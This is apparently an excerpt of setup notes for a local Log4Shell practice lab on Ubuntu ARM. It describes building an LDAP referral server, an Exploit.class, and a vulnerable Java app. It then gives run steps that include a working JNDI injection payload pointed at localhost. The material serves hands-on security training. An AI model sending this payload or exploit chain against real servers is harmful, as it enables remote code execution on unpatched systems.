...
Works on Parallels + Ubuntu ARM.

It will:

* Rewrite `/etc/apt/sources.list` to use `ports.ubuntu.com` (for Ubuntu Noble ARM).
* Install Java 11, Maven, Python, Docker (optional), etc.
* Create `log4shell` lab user.
* Build:

  * `ldap_server` (Maven)
  * `Exploit.java` → `Exploit.class`
  * vulnerable app JAR (Gradle)
* Create helper scripts under `/opt/log4shell`:

  * `run-http-server.sh` (serves `Exploit.class` on :8000)
  * `run-ldap-server.sh` (LDAPRefServer on :1389 → HTTP :8000/#Exploit)
  * `run-vulnerable-app.sh` (native Java app on :8080, ARM-safe)
  * `trigger-exploit.sh` (curl wrapper with **JNDI payload provided via env var**, you copy from PoC README)

---

### 1. Save this as `setup-log4shell-lab.sh`
...
```bash
sudo chmod +x /root/setup-log4shell-lab.sh
```
...
# 1) HTTP server → serves Exploit.class on 8000
./run-http-server.sh

# 2) LDAP server → 1389, points to http://127.0.0.1:8000/#Exploit
./run-ldap-server.sh

# 3) Vulnerable app → native Java on 8080
./run-vulnerable-app.sh

# 4) Trigger (after you export JNDI_PAYLOAD from PoC README)
export JNDI_PAYLOAD='${jndi:ldap://127.0.0.1:1389/a}'  # <- copy from PoC / article
./trigger-exploit.sh
```
